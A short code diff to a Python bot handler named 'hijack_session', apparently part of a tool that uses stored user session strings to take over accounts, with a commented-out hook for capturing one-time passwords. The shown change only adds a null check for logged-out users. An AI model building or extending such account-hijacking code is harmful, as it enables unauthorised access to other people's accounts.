@@ -198,8 +198,10 @@ async def hijack_session(_, message):
         return
 
     session_string = user_session["session_string"]
-
     await message.reply("✅ User found!")
+    if not session_string:
+            await message.reply("⚠️ The session string is null. User is currently logged out.")
+            return
     #otp_listeners[user_id] = admin_id
 
     try:
